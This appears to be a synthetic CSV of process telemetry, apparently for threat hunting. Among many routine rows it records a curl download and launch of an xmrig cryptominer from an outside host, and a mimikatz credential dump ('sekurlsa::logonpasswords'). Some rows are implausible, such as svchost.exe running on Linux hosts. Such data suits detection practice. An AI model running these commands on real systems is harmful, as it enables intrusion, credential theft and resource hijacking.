winws1297,m.chen,teams.exe,22601,explorer.exe,6790,null,2025-09-15 08:44:51.789678 UTC
winws0147,m.chen,teams.exe,24901,explorer.exe,7290,null,2025-09-15 08:49:27.456345 UTC
winws1305,m.chen,teams.exe,23601,explorer.exe,7010,null,2025-09-15 08:46:51.123012 UTC
winws1083,p.patel,chrome.exe,19501,explorer.exe,6110,null,2025-09-15 08:38:42.789678 UTC
winws1219,p.patel,chrome.exe,12801,explorer.exe,4640,null,2025-09-15 08:25:21.789678 UTC
winws1063,p.patel,chrome.exe,14501,explorer.exe,5010,null,2025-09-15 08:28:42.123012 UTC
winws0113,p.patel,chrome.exe,16401,explorer.exe,5420,null,2025-09-15 08:32:27.123012 UTC
winws1229,p.patel,chrome.exe,14101,explorer.exe,4920,null,2025-09-15 08:27:51.456345 UTC
winws0093,p.patel,chrome.exe,11401,explorer.exe,4320,null,2025-09-15 08:22:27.456345 UTC
winws0152,p.patel,chrome.exe,10601,explorer.exe,4140,null,2025-09-15 08:20:48.456345 UTC
winws1259,p.patel,chrome.exe,17801,explorer.exe,5740,null,2025-09-15 08:35:21.456345 UTC
winws0133,p.patel,chrome.exe,21401,explorer.exe,6520,null,2025-09-15 08:42:27.789678 UTC
winws1269,p.patel,chrome.exe,19101,explorer.exe,6020,null,2025-09-15 08:37:51.123012 UTC
winws1299,p.patel,chrome.exe,22801,explorer.exe,6840,null,2025-09-15 08:45:21.123012 UTC
winws0221,p.patel,explorer.exe,6060,services.exe,500,null,2025-09-15 08:38:18.123012 UTC
winws1048,p.patel,explorer.exe,4180,services.exe,500,null,2025-09-15 08:21:12.123012 UTC
winws1312,p.patel,explorer.exe,7190,services.exe,500,null,2025-09-15 08:48:30.123012 UTC
winws0211,p.patel,explorer.exe,5790,services.exe,500,null,2025-09-15 08:35:48.456345 UTC
winws0202,p.patel,explorer.exe,5510,services.exe,500,null,2025-09-15 08:33:18.789678 UTC
winws0098,p.patel,explorer.exe,4600,services.exe,500,null,2025-09-15 08:24:57.123012 UTC
winws0182,p.patel,explorer.exe,4960,services.exe,500,null,2025-09-15 08:28:18.456345 UTC
winws0175,p.patel,explorer.exe,4780,services.exe,500,null,2025-09-15 08:26:33.789678 UTC
winws0265,p.patel,explorer.exe,7270,services.exe,500,null,2025-09-15 08:49:18.456345 UTC
winws0118,p.patel,explorer.exe,5700,services.exe,500,null,2025-09-15 08:34:57.789678 UTC
winws0214,p.patel,explorer.exe,5880,services.exe,500,null,2025-09-15 08:36:33.456345 UTC
winws0192,p.patel,explorer.exe,5240,services.exe,500,null,2025-09-15 08:30:48.123012 UTC
winws0231,p.patel,explorer.exe,6340,services.exe,500,null,2025-09-15 08:40:48.789678 UTC
winws1068,p.patel,explorer.exe,5280,services.exe,500,null,2025-09-15 08:31:12.789678 UTC
winws1098,p.patel,explorer.exe,6930,services.exe,500,null,2025-09-15 08:46:12.789678 UTC
winws1236,p.patel,explorer.exe,5100,services.exe,500,null,2025-09-15 08:29:30.456345 UTC
winws0146,p.patel,explorer.exe,7240,services.exe,500,null,2025-09-15 08:48:57.123012 UTC
winws1304,p.patel,explorer.exe,6970,services.exe,500,null,2025-09-15 08:46:30.789678 UTC
winws1078,p.patel,explorer.exe,5830,services.exe,500,null,2025-09-15 08:36:12.123012 UTC
winws1058,p.patel,explorer.exe,4730,services.exe,500,null,2025-09-15 08:26:12.456345 UTC
winws1088,p.patel,explorer.exe,6380,services.exe,500,null,2025-09-15 08:41:12.456345 UTC
winws0172,p.patel,explorer.exe,4690,services.exe,500,null,2025-09-15 08:25:48.789678 UTC
winws0142,p.patel,explorer.exe,7020,services.exe,500,null,2025-09-15 08:46:57.789678 UTC
winws0155,p.patel,explorer.exe,4230,services.exe,500,null,2025-09-15 08:21:33.456345 UTC
winws0138,p.patel,explorer.exe,6800,services.exe,500,null,2025-09-15 08:44:57.456345 UTC
winws0257,p.patel,explorer.exe,7050,services.exe,500,null,2025-09-15 08:47:18.123012 UTC
winws0251,p.patel,explorer.exe,6890,services.exe,500,null,2025-09-15 08:45:48.123012 UTC
winws0128,p.patel,explorer.exe,6250,services.exe,500,null,2025-09-15 08:39:57.123012 UTC
winws1320,p.patel,explorer.exe,7410,services.exe,500,null,2025-09-15 08:50:30.456345 UTC
winws0195,p.patel,explorer.exe,5330,services.exe,500,null,2025-09-15 08:31:33.123012 UTC
winws0162,p.patel,explorer.exe,4410,services.exe,500,null,2025-09-15 08:23:18.123012 UTC
winws0241,p.patel,explorer.exe,6610,services.exe,500,null,2025-09-15 08:43:18.456345 UTC
winws1216,p.patel,explorer.exe,4550,services.exe,500,null,2025-09-15 08:24:30.123012 UTC
winws1296,p.patel,explorer.exe,6750,services.exe,500,null,2025-09-15 08:44:30.456345 UTC
winws1276,p.patel,explorer.exe,6200,services.exe,500,null,2025-09-15 08:39:30.123012 UTC
winws0108,p.patel,explorer.exe,5150,services.exe,500,null,2025-09-15 08:29:57.456345 UTC
winws0234,p.patel,explorer.exe,6430,services.exe,500,null,2025-09-15 08:41:33.789678 UTC
winws1101,p.patel,msedge.exe,24001,explorer.exe,7100,null,2025-09-15 08:47:42.789678 UTC
winws1073,p.patel,msedge.exe,17001,explorer.exe,5560,null,2025-09-15 08:33:42.456345 UTC
winws1279,p.patel,msedge.exe,20301,explorer.exe,6290,null,2025-09-15 08:40:21.789678 UTC
winws1046,p.patel,msedge.exe,10201,explorer.exe,4060,null,2025-09-15 08:15:22.321654 UTC
winws0224,p.patel,msedge.exe,19701,explorer.exe,6150,null,2025-09-15 08:39:03.123012 UTC
winws1105,p.patel,msedge.exe,25001,explorer.exe,7320,null,2025-09-15 08:49:42.123012 UTC
winws0185,p.patel,msedge.exe,14701,explorer.exe,5050,null,2025-09-15 08:29:03.456345 UTC
winws1239,p.patel,msedge.exe,15301,explorer.exe,5190,null,2025-09-15 08:30:21.123012 UTC
winws1053,p.patel,msedge.exe,12001,explorer.exe,4460,null,2025-09-15 08:23:42.789678 UTC
winws1093,p.patel,msedge.exe,22001,explorer.exe,6660,null,2025-09-15 08:43:42.123012 UTC
winws1266,p.patel,svchost.exe,6500,services.exe,500,null,2025-09-15 08:37:00.456345 UTC
winws1206,p.patel,svchost.exe,2000,services.exe,500,null,2025-09-15 08:22:00.456345 UTC
winws1226,p.patel,svchost.exe,3500,services.exe,500,null,2025-09-15 08:27:00.789678 UTC
winws1246,p.patel,svchost.exe,5000,services.exe,500,null,2025-09-15 08:32:00.123012 UTC
winws1286,p.patel,svchost.exe,8000,services.exe,500,null,2025-09-15 08:42:00.789678 UTC
winws0165,p.patel,teams.exe,12201,explorer.exe,4500,null,2025-09-15 08:24:03.123012 UTC
winws0244,p.patel,teams.exe,22201,explorer.exe,6700,null,2025-09-15 08:44:03.456345 UTC
winws0268,p.patel,teams.exe,25201,explorer.exe,7360,null,2025-09-15 08:50:03.456345 UTC
winws1209,p.patel,teams.exe,11601,explorer.exe,4370,null,2025-09-15 08:22:51.123012 UTC
winws1289,p.patel,teams.exe,21601,explorer.exe,6570,null,2025-09-15 08:42:51.456345 UTC
winws0205,p.patel,teams.exe,17201,explorer.exe,5600,null,2025-09-15 08:34:03.789678 UTC
winws0260,p.patel,teams.exe,24201,explorer.exe,7140,null,2025-09-15 08:48:03.123012 UTC
winws0123,p.patel,teams.exe,18901,explorer.exe,5970,null,2025-09-15 08:37:27.456345 UTC
winws1249,p.patel,teams.exe,16601,explorer.exe,5470,null,2025-09-15 08:32:51.789678 UTC
winws0103,p.patel,teams.exe,13901,explorer.exe,4870,null,2025-09-15 08:27:27.789678 UTC
linsrv0300,svc_api,curl,2200,bash,2150,curl -o /tmp/xmrig http://data-miner-pool.net/xmrig,2025-09-15 08:16:15.456234 UTC
linsrv0300,svc_api,chmod,2201,bash,2150,chmod +x /tmp/xmrig,2025-09-15 08:16:18.789567 UTC
linapp0103,svc_api,gunicorn,11401,systemd,1,null,2025-09-15 08:20:39.456345 UTC
linsrv0300,svc_api,bash,2150,sshd,2100,null,2025-09-15 08:16:10.12389 UTC
linsrv0300,svc_api,xmrig,2205,bash,2150,./tmp/xmrig -o 185.125.190.22:4444 -u (wallet) -p x,2025-09-15 08:16:20.123901 UTC
linsrv0300,svc_api,sshd,2100,systemd,1,null,2025-09-15 08:16:00.789456 UTC
linapp0132,svc_api,java,14301,systemd,1,null,2025-09-15 08:35:06.789678 UTC
linapp0120,svc_api,java,13101,systemd,1,null,2025-09-15 08:29:06.789678 UTC
linapp0124,svc_api,java,13501,systemd,1,null,2025-09-15 08:31:06.123012 UTC
linapp0142,svc_api,java,15301,systemd,1,null,2025-09-15 08:40:06.123012 UTC
linapp0154,svc_api,java,16501,systemd,1,null,2025-09-15 08:46:06.123012 UTC
linapp0128,svc_api,java,13901,systemd,1,null,2025-09-15 08:33:06.456345 UTC
linapp0152,svc_api,java,16301,systemd,1,null,2025-09-15 08:45:06.456345 UTC
linapp0134,svc_api,java,14501,systemd,1,null,2025-09-15 08:36:06.456345 UTC
linapp0104,svc_api,java,11501,systemd,1,null,2025-09-15 08:21:06.456345 UTC
linapp0101,svc_api,java,11201,systemd,1,null,2025-09-15 08:05:12.456789 UTC
linapp0106,svc_api,java,11701,systemd,1,null,2025-09-15 08:22:06.123012 UTC
linapp0160,svc_api,java,17101,systemd,1,null,2025-09-15 08:49:06.123012 UTC
linapp0116,svc_api,java,12701,systemd,1,null,2025-09-15 08:27:06.456345 UTC
linapp0126,svc_api,java,13701,systemd,1,null,2025-09-15 08:32:06.789678 UTC
linapp0156,svc_api,java,16701,systemd,1,null,2025-09-15 08:47:06.789678 UTC
linapp0112,svc_api,java,12301,systemd,1,null,2025-09-15 08:25:06.123012 UTC
linapp0144,svc_api,java,15501,systemd,1,null,2025-09-15 08:41:06.789678 UTC
linapp0138,svc_api,java,14901,systemd,1,null,2025-09-15 08:38:06.789678 UTC
linapp0118,svc_api,java,12901,systemd,1,null,2025-09-15 08:28:06.123012 UTC
linapp0110,svc_api,java,12101,systemd,1,null,2025-09-15 08:24:06.456345 UTC
linapp0136,svc_api,java,14701,systemd,1,null,2025-09-15 08:37:06.123012 UTC
linapp0150,svc_api,java,16101,systemd,1,null,2025-09-15 08:44:06.789678 UTC
linapp0140,svc_api,java,15101,systemd,1,null,2025-09-15 08:39:06.456345 UTC
linapp0148,svc_api,java,15901,systemd,1,null,2025-09-15 08:43:06.123012 UTC
linapp0158,svc_api,java,16901,systemd,1,null,2025-09-15 08:48:06.456345 UTC
linapp0108,svc_api,java,11901,systemd,1,null,2025-09-15 08:23:06.789678 UTC
linapp0162,svc_api,java,17301,systemd,1,null,2025-09-15 08:50:06.789678 UTC
linapp0122,svc_api,java,13301,systemd,1,null,2025-09-15 08:30:06.456345 UTC
linapp0114,svc_api,java,12501,systemd,1,null,2025-09-15 08:26:06.789678 UTC
linapp0130,svc_api,java,14101,systemd,1,null,2025-09-15 08:34:06.123012 UTC
linapp0146,svc_api,java,15701,systemd,1,null,2025-09-15 08:42:06.456345 UTC
linapp0119,svc_api,python3,13001,bash,11080,null,2025-09-15 08:28:36.456345 UTC
linapp0153,svc_api,python3,16401,bash,11250,null,2025-09-15 08:45:36.789678 UTC
linapp0107,svc_api,python3,11801,bash,11020,null,2025-09-15 08:22:36.456345 UTC
linapp0137,svc_api,python3,14801,bash,11170,null,2025-09-15 08:37:36.456345 UTC
linapp0139,svc_api,python3,15001,bash,11180,null,2025-09-15 08:38:36.123012 UTC
linapp0135,svc_api,python3,14601,bash,11160,null,2025-09-15 08:36:36.789678 UTC
linapp0161,svc_api,python3,17201,bash,11290,null,2025-09-15 08:49:36.456345 UTC
linapp0117,svc_api,python3,12801,bash,11070,null,2025-09-15 08:27:36.789678 UTC
linapp0125,svc_api,python3,13601,bash,11110,null,2025-09-15 08:31:36.456345 UTC
linapp0129,svc_api,python3,14001,bash,11130,null,2025-09-15 08:33:36.789678 UTC
linapp0133,svc_api,python3,14401,bash,11150,null,2025-09-15 08:35:36.123012 UTC
linapp0109,svc_api,python3,12001,bash,11030,null,2025-09-15 08:23:36.123012 UTC
linapp0149,svc_api,python3,16001,bash,11230,null,2025-09-15 08:43:36.456345 UTC
linapp0127,svc_api,python3,13801,bash,11120,null,2025-09-15 08:32:36.123012 UTC
linapp0102,svc_api,python3,11301,bash,11000,null,2025-09-15 08:15:25.654987 UTC
linapp0159,svc_api,python3,17001,bash,11280,null,2025-09-15 08:48:36.789678 UTC
linapp0145,svc_api,python3,15601,bash,11210,null,2025-09-15 08:41:36.123012 UTC
linapp0123,svc_api,python3,13401,bash,11100,null,2025-09-15 08:30:36.789678 UTC
linapp0115,svc_api,python3,12601,bash,11060,null,2025-09-15 08:26:36.123012 UTC
linapp0111,svc_api,python3,12201,bash,11040,null,2025-09-15 08:24:36.789678 UTC
linapp0141,svc_api,python3,15201,bash,11190,null,2025-09-15 08:39:36.789678 UTC
linapp0131,svc_api,python3,14201,bash,11140,null,2025-09-15 08:34:36.456345 UTC
linapp0113,svc_api,python3,12401,bash,11050,null,2025-09-15 08:25:36.456345 UTC
linapp0105,svc_api,python3,11601,bash,11010,null,2025-09-15 08:21:36.789678 UTC
linapp0147,svc_api,python3,15801,bash,11220,null,2025-09-15 08:42:36.789678 UTC
linapp0155,svc_api,python3,16601,bash,11260,null,2025-09-15 08:46:36.456345 UTC
linapp0157,svc_api,python3,16801,bash,11270,null,2025-09-15 08:47:36.123012 UTC
linapp0143,svc_api,python3,15401,bash,11200,null,2025-09-15 08:40:36.456345 UTC
linapp0121,svc_api,python3,13201,bash,11090,null,2025-09-15 08:29:36.123012 UTC
linapp0151,svc_api,python3,16201,bash,11240,null,2025-09-15 08:44:36.123012 UTC
lindb0089,svc_prod_db,cron,2500,systemd,1,null,2025-09-15 08:44:45.123012 UTC
lindb0083,svc_prod_db,cron,2440,systemd,1,null,2025-09-15 08:41:45.123012 UTC
lindb0047,svc_prod_db,cron,2080,systemd,1,null,2025-09-15 08:23:45.123012 UTC
lindb0077,svc_prod_db,cron,2380,systemd,1,null,2025-09-15 08:38:45.123012 UTC
lindb0093,svc_prod_db,cron,2540,systemd,1,null,2025-09-15 08:46:45.456345 UTC
lindb0071,svc_prod_db,cron,2320,systemd,1,null,2025-09-15 08:35:45.123012 UTC
lindb0085,svc_prod_db,cron,2460,systemd,1,null,2025-09-15 08:42:45.789678 UTC
lindb0097,svc_prod_db,cron,2580,systemd,1,null,2025-09-15 08:48:45.789678 UTC
lindb0045,svc_prod_db,cron,2060,systemd,1,null,2025-09-15 08:22:45.456345 UTC
lindb0067,svc_prod_db,cron,2280,systemd,1,null,2025-09-15 08:33:45.789678 UTC
lindb0043,svc_prod_db,cron,2040,systemd,1,null,2025-09-15 08:21:45.789678 UTC
lindb0041,svc_prod_db,cron,2020,systemd,1,null,2025-09-15 08:20:45.123012 UTC
lindb0055,svc_prod_db,cron,2160,systemd,1,null,2025-09-15 08:27:45.789678 UTC
lindb0061,svc_prod_db,cron,2220,systemd,1,null,2025-09-15 08:30:45.789678 UTC
lindb0049,svc_prod_db,cron,2100,systemd,1,null,2025-09-15 08:24:45.789678 UTC
lindb0063,svc_prod_db,cron,2240,systemd,1,null,2025-09-15 08:31:45.456345 UTC
lindb0059,svc_prod_db,cron,2200,systemd,1,null,2025-09-15 08:29:45.123012 UTC
lindb0073,svc_prod_db,cron,2340,systemd,1,null,2025-09-15 08:36:45.789678 UTC
lindb0075,svc_prod_db,cron,2360,systemd,1,null,2025-09-15 08:37:45.456345 UTC
lindb0095,svc_prod_db,cron,2560,systemd,1,null,2025-09-15 08:47:45.123012 UTC
lindb0081,svc_prod_db,cron,2420,systemd,1,null,2025-09-15 08:40:45.456345 UTC
lindb0053,svc_prod_db,cron,2140,systemd,1,null,2025-09-15 08:26:45.123012 UTC
lindb0065,svc_prod_db,cron,2260,systemd,1,null,2025-09-15 08:32:45.123012 UTC
lindb0087,svc_prod_db,cron,2480,systemd,1,null,2025-09-15 08:43:45.456345 UTC
lindb0069,svc_prod_db,cron,2300,systemd,1,null,2025-09-15 08:34:45.456345 UTC
lindb0057,svc_prod_db,cron,2180,systemd,1,null,2025-09-15 08:28:45.456345 UTC
lindb0099,svc_prod_db,cron,2600,systemd,1,null,2025-09-15 08:49:45.456345 UTC
lindb0051,svc_prod_db,cron,2120,systemd,1,null,2025-09-15 08:25:45.456345 UTC
lindb0091,svc_prod_db,cron,2520,systemd,1,null,2025-09-15 08:45:45.789678 UTC
lindb0079,svc_prod_db,cron,2400,systemd,1,null,2025-09-15 08:39:45.789678 UTC
lindb0080,svc_prod_db,postgres,2410,systemd,1,null,2025-09-15 08:40:15.123012 UTC
lindb0068,svc_prod_db,postgres,2290,systemd,1,null,2025-09-15 08:34:15.123012 UTC
lindb0098,svc_prod_db,postgres,2590,systemd,1,null,2025-09-15 08:49:15.123012 UTC
lindb0078,svc_prod_db,postgres,2390,systemd,1,null,2025-09-15 08:39:15.456345 UTC
lindb0072,svc_prod_db,postgres,2330,systemd,1,null,2025-09-15 08:36:15.456345 UTC
lindb0084,svc_prod_db,postgres,2450,systemd,1,null,2025-09-15 08:42:15.456345 UTC
lindb0096,svc_prod_db,postgres,2570,systemd,1,null,2025-09-15 08:48:15.456345 UTC
lindb0060,svc_prod_db,postgres,2210,systemd,1,null,2025-09-15 08:30:15.456345 UTC
lindb0058,svc_prod_db,postgres,2190,systemd,1,null,2025-09-15 08:29:15.789678 UTC
lindb0040,svc_prod_db,postgres,2010,systemd,1,null,2025-09-15 08:15:20.987654 UTC
lindb0086,svc_prod_db,postgres,2470,systemd,1,null,2025-09-15 08:43:15.123012 UTC
lindb0054,svc_prod_db,postgres,2150,systemd,1,null,2025-09-15 08:27:15.456345 UTC
lindb0092,svc_prod_db,postgres,2530,systemd,1,null,2025-09-15 08:46:15.123012 UTC
lindb0042,svc_prod_db,postgres,2030,systemd,1,null,2025-09-15 08:21:15.456345 UTC
lindb0070,svc_prod_db,postgres,2310,systemd,1,null,2025-09-15 08:35:15.789678 UTC
lindb0062,svc_prod_db,postgres,2230,systemd,1,null,2025-09-15 08:31:15.123012 UTC
lindb0052,svc_prod_db,postgres,2130,systemd,1,null,2025-09-15 08:26:15.789678 UTC
lindb0056,svc_prod_db,postgres,2170,systemd,1,null,2025-09-15 08:28:15.123012 UTC
lindb0094,svc_prod_db,postgres,2550,systemd,1,null,2025-09-15 08:47:15.789678 UTC
lindb0048,svc_prod_db,postgres,2090,systemd,1,null,2025-09-15 08:24:15.456345 UTC
lindb0064,svc_prod_db,postgres,2250,systemd,1,null,2025-09-15 08:32:15.789678 UTC
lindb0090,svc_prod_db,postgres,2510,systemd,1,null,2025-09-15 08:45:15.456345 UTC
lindb0088,svc_prod_db,postgres,2490,systemd,1,null,2025-09-15 08:44:15.789678 UTC
lindb0100,svc_prod_db,postgres,2610,systemd,1,null,2025-09-15 08:50:15.789678 UTC
lindb0082,svc_prod_db,postgres,2430,systemd,1,null,2025-09-15 08:41:15.789678 UTC
lindb0074,svc_prod_db,postgres,2350,systemd,1,null,2025-09-15 08:37:15.123012 UTC
lindb0046,svc_prod_db,postgres,2070,systemd,1,null,2025-09-15 08:23:15.789678 UTC
lindb0076,svc_prod_db,postgres,2370,systemd,1,null,2025-09-15 08:38:15.789678 UTC
lindb0050,svc_prod_db,postgres,2110,systemd,1,null,2025-09-15 08:25:15.123012 UTC
lindb0066,svc_prod_db,postgres,2270,systemd,1,null,2025-09-15 08:33:15.456345 UTC
lindb0044,svc_prod_db,postgres,2050,systemd,1,null,2025-09-15 08:22:15.123012 UTC
winws1045,system,mimikatz.exe,8550,cmd.exe,8500,"""C:\Users\Public\mimi.exe"" ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""",2025-09-15 08:10:16.445566 UTC
linsrv0300,system,systemd,1,init,0,null,2025-09-15 08:15:30.456123 UTC
winws1045,system,cmd.exe,8500,powershell.exe,7100,cmd.exe /c C:\Users\Public\mimi.exe,2025-09-15 08:10:15.112345 UTC
linsrv0327,system,docker,3140,systemd,1,null,2025-09-15 08:33:54.789678 UTC
linsrv0323,system,docker,3120,systemd,1,null,2025-09-15 08:31:54.456345 UTC
linsrv0353,system,docker,3270,systemd,1,null,2025-09-15 08:46:54.456345 UTC
linsrv0307,system,docker,3040,systemd,1,null,2025-09-15 08:23:54.123012 UTC
linsrv0319,system,docker,3100,systemd,1,null,2025-09-15 08:29:54.123012 UTC
linsrv0321,system,docker,3110,systemd,1,null,2025-09-15 08:30:54.789678 UTC
linsrv0317,system,docker,3090,systemd,1,null,2025-09-15 08:28:54.456345 UTC
linsrv0339,system,docker,3200,systemd,1,null,2025-09-15 08:39:54.789678 UTC
linsrv0359,system,docker,3300,systemd,1,null,2025-09-15 08:49:54.456345 UTC
linsrv0301,system,docker,3010,systemd,1,null,2025-09-15 08:20:54.123012 UTC
linsrv0333,system,docker,3170,systemd,1,null,2025-09-15 08:36:54.789678 UTC
linsrv0331,system,docker,3160,systemd,1,null,2025-09-15 08:35:54.123012 UTC
linsrv0313,system,docker,3070,systemd,1,null,2025-09-15 08:26:54.123012 UTC
linsrv0325,system,docker,3130,systemd,1,null,2025-09-15 08:32:54.123012 UTC
linsrv0329,system,docker,3150,systemd,1,null,2025-09-15 08:34:54.456345 UTC
linsrv0343,system,docker,3220,systemd,1,null,2025-09-15 08:41:54.123012 UTC
linsrv0345,system,docker,3230,systemd,1,null,2025-09-15 08:42:54.789678 UTC
linsrv0357,system,docker,3290,systemd,1,null,2025-09-15 08:48:54.789678 UTC
linsrv0311,system,docker,3060,systemd,1,null,2025-09-15 08:25:54.456345 UTC
linsrv0305,system,docker,3030,systemd,1,null,2025-09-15 08:22:54.456345 UTC
linsrv0341,system,docker,3210,systemd,1,null,2025-09-15 08:40:54.456345 UTC
linsrv0355,system,docker,3280,systemd,1,null,2025-09-15 08:47:54.123012 UTC
linsrv0337,system,docker,3190,systemd,1,null,2025-09-15 08:38:54.123012 UTC
linsrv0303,system,docker,3020,systemd,1,null,2025-09-15 08:21:54.789678 UTC
linsrv0351,system,docker,3260,systemd,1,null,2025-09-15 08:45:54.789678 UTC
linsrv0309,system,docker,3050,systemd,1,null,2025-09-15 08:24:54.789678 UTC
linsrv0349,system,docker,3250,systemd,1,null,2025-09-15 08:44:54.123012 UTC
linsrv0335,system,docker,3180,systemd,1,null,2025-09-15 08:37:54.456345 UTC
linsrv0315,system,docker,3080,systemd,1,null,2025-09-15 08:27:54.789678 UTC
linsrv0347,system,docker,3240,systemd,1,null,2025-09-15 08:43:54.456345 UTC
winsrv0237,system,lsass.exe,708,services.exe,500,null,2025-09-15 08:28:39.789678 UTC
winsrv0257,system,lsass.exe,718,services.exe,500,null,2025-09-15 08:38:39.456345 UTC
winsrv0233,system,lsass.exe,706,services.exe,500,null,2025-09-15 08:26:39.456345 UTC
winsrv0223,system,lsass.exe,701,services.exe,500,null,2025-09-15 08:21:39.123012 UTC
winsrv0259,system,lsass.exe,719,services.exe,500,null,2025-09-15 08:39:39.123012 UTC
winsrv0269,system,lsass.exe,724,services.exe,500,null,2025-09-15 08:44:39.456345 UTC
winsrv0255,system,lsass.exe,717,services.exe,500,null,2025-09-15 08:37:39.789678 UTC
winsrv0247,system,lsass.exe,713,services.exe,500,null,2025-09-15 08:33:39.123012 UTC
winsrv0265,system,lsass.exe,722,services.exe,500,null,2025-09-15 08:42:39.123012 UTC
winsrv0279,system,lsass.exe,729,services.exe,500,null,2025-09-15 08:49:39.789678 UTC
winsrv0235,system,lsass.exe,707,services.exe,500,null,2025-09-15 08:27:39.123012 UTC
winsrv0275,system,lsass.exe,727,services.exe,500,null,2025-09-15 08:47:39.456345 UTC
winsrv0231,system,lsass.exe,705,services.exe,500,null,2025-09-15 08:25:39.789678 UTC
winsrv0273,system,lsass.exe,726,services.exe,500,null,2025-09-15 08:46:39.789678 UTC
winsrv0227,system,lsass.exe,703,services.exe,500,null,2025-09-15 08:23:39.456345 UTC
winsrv0267,system,lsass.exe,723,services.exe,500,null,2025-09-15 08:43:39.789678 UTC
winsrv0229,system,lsass.exe,704,services.exe,500,null,2025-09-15 08:24:39.123012 UTC
winsrv0241,system,lsass.exe,710,services.exe,500,null,2025-09-15 08:30:39.123012 UTC
winsrv0245,system,lsass.exe,712,services.exe,500,null,2025-09-15 08:32:39.456345 UTC
winsrv0263,system,lsass.exe,721,services.exe,500,null,2025-09-15 08:41:39.456345 UTC
winsrv0251,system,lsass.exe,715,services.exe,500,null,2025-09-15 08:35:39.456345 UTC
winsrv0243,system,lsass.exe,711,services.exe,500,null,2025-09-15 08:31:39.789678 UTC
winsrv0225,system,lsass.exe,702,services.exe,500,null,2025-09-15 08:22:39.789678 UTC
winsrv0271,system,lsass.exe,725,services.exe,500,null,2025-09-15 08:45:39.123012 UTC
winsrv0277,system,lsass.exe,728,services.exe,500,null,2025-09-15 08:48:39.123012 UTC
winsrv0249,system,lsass.exe,714,services.exe,500,null,2025-09-15 08:34:39.789678 UTC
winsrv0261,system,lsass.exe,720,services.exe,500,null,2025-09-15 08:40:39.789678 UTC
winsrv0239,system,lsass.exe,709,services.exe,500,null,2025-09-15 08:29:39.456345 UTC
winsrv0253,system,lsass.exe,716,services.exe,500,null,2025-09-15 08:36:39.123012 UTC
winsrv0221,system,lsass.exe,700,services.exe,500,null,2025-09-15 08:20:36.123012 UTC
winsrv0280,system,svchost.exe,10500,services.exe,500,null,2025-09-15 08:50:09.123012 UTC
winsrv0240,system,svchost.exe,4500,services.exe,500,null,2025-09-15 08:30:09.789678 UTC
linsrv0336,system,svchost.exe,7000,services.exe,500,null,2025-09-15 08:38:24.789678 UTC
winsrv0242,system,svchost.exe,4800,services.exe,500,null,2025-09-15 08:31:09.456345 UTC
linsrv0310,system,svchost.exe,3100,services.exe,500,null,2025-09-15 08:25:24.123012 UTC
winsrv0264,system,svchost.exe,8100,services.exe,500,null,2025-09-15 08:42:09.789678 UTC
linsrv0358,system,svchost.exe,10300,services.exe,500,null,2025-09-15 08:49:24.123012 UTC
winsrv0220,system,svchost.exe,1500,services.exe,500,null,2025-09-15 08:05:18.987654 UTC
linsrv0302,system,svchost.exe,1900,services.exe,500,null,2025-09-15 08:21:24.456345 UTC
linsrv0316,system,svchost.exe,4000,services.exe,500,null,2025-09-15 08:28:24.123012 UTC
linsrv0334,system,svchost.exe,6700,services.exe,500,null,2025-09-15 08:37:24.123012 UTC
winsrv0274,system,svchost.exe,9600,services.exe,500,null,2025-09-15 08:47:09.123012 UTC
winsrv0256,system,svchost.exe,6900,services.exe,500,null,2025-09-15 08:38:09.123012 UTC
winsrv0268,system,svchost.exe,8700,services.exe,500,null,2025-09-15 08:44:09.123012 UTC
linsrv0312,system,svchost.exe,3400,services.exe,500,null,2025-09-15 08:26:24.789678 UTC
linsrv0332,system,svchost.exe,6400,services.exe,500,null,2025-09-15 08:36:24.456345 UTC
linsrv0304,system,svchost.exe,2200,services.exe,500,null,2025-09-15 08:22:24.123012 UTC
winsrv0276,system,svchost.exe,9900,services.exe,500,null,2025-09-15 08:48:09.789678 UTC
linsrv0356,system,svchost.exe,10000,services.exe,500,null,2025-09-15 08:48:24.456345 UTC
winsrv0278,system,svchost.exe,10200,services.exe,500,null,2025-09-15 08:49:09.456345 UTC
linsrv0340,system,svchost.exe,7600,services.exe,500,null,2025-09-15 08:40:24.123012 UTC
winsrv0252,system,svchost.exe,6300,services.exe,500,null,2025-09-15 08:36:09.789678 UTC
linsrv0322,system,svchost.exe,4900,services.exe,500,null,2025-09-15 08:31:24.123012 UTC
winsrv0246,system,svchost.exe,5400,services.exe,500,null,2025-09-15 08:33:09.789678 UTC
winsrv0222,system,svchost.exe,1800,services.exe,500,null,2025-09-15 08:21:09.789678 UTC
linsrv0342,system,svchost.exe,7900,services.exe,500,null,2025-09-15 08:41:24.789678 UTC
linsrv0328,system,svchost.exe,5800,services.exe,500,null,2025-09-15 08:34:24.123012 UTC
winsrv0266,system,svchost.exe,8400,services.exe,500,null,2025-09-15 08:43:09.456345 UTC
linsrv0308,system,svchost.exe,2800,services.exe,500,null,2025-09-15 08:24:24.456345 UTC
winsrv0244,system,svchost.exe,5100,services.exe,500,null,2025-09-15 08:32:09.123012 UTC
linsrv0354,system,svchost.exe,9700,services.exe,500,null,2025-09-15 08:47:24.789678 UTC
winsrv0254,system,svchost.exe,6600,services.exe,500,null,2025-09-15 08:37:09.456345 UTC
winsrv0248,system,svchost.exe,5700,services.exe,500,null,2025-09-15 08:34:09.456345 UTC
winsrv0232,system,svchost.exe,3300,services.exe,500,null,2025-09-15 08:26:09.123012 UTC
linsrv0326,system,svchost.exe,5500,services.exe,500,null,2025-09-15 08:33:24.456345 UTC
linsrv0324,system,svchost.exe,5200,services.exe,500,null,2025-09-15 08:32:24.789678 UTC
linsrv0352,system,svchost.exe,9400,services.exe,500,null,2025-09-15 08:46:24.123012 UTC
linsrv0330,system,svchost.exe,6100,services.exe,500,null,2025-09-15 08:35:24.789678 UTC
winsrv0238,system,svchost.exe,4200,services.exe,500,null,2025-09-15 08:29:09.123012 UTC
linsrv0344,system,svchost.exe,8200,services.exe,500,null,2025-09-15 08:42:24.456345 UTC
linsrv0346,system,svchost.exe,8500,services.exe,500,null,2025-09-15 08:43:24.123012 UTC
linsrv0360,system,svchost.exe,10600,services.exe,500,null,2025-09-15 08:50:24.789678 UTC
linsrv0318,system,svchost.exe,4300,services.exe,500,null,2025-09-15 08:29:24.789678 UTC
linsrv0350,system,svchost.exe,9100,services.exe,500,null,2025-09-15 08:45:24.456345 UTC
winsrv0228,system,svchost.exe,2700,services.exe,500,null,2025-09-15 08:24:09.789678 UTC
winsrv0272,system,svchost.exe,9300,services.exe,500,null,2025-09-15 08:46:09.456345 UTC
